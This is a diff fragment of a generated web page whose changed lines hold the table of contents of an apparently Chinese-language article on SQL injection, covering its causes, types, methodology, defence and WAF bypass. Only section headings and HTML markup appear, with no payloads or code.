href="#4%E3%80%81%E9%80%89%E6%8B%A9%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">4、选择注入方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E7%BB%93%E5%90%88WAF%E7%A1%AE%E5%AE%9A%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-text">5、结合WAF确定注入语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-text">五、SQL注入防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81WAF%E7%BB%95%E8%BF%87"><span class="toc-text">六、WAF绕过</span></a></li></ol>
+
       </div>
     </article>
   
@@ -846,7 +1059,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">二、SQL注入产生原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">三、注入类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-text">四、SQL注入思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1、发现注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E7%AC%A6"><span class="toc-text">2、判断闭合符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-text">3、判断数据库类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E9%80%89%E6%8B%A9%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">4、选择注入方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E7%BB%93%E5%90%88WAF%E7%A1%AE%E5%AE%9A%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-text">5、结合WAF确定注入语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-text">五、SQL注入防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81WAF%E7%BB%95%E8%BF%87"><span class="toc-text">六、WAF绕过</span></a></li></ol>
+
     </article>
   
   
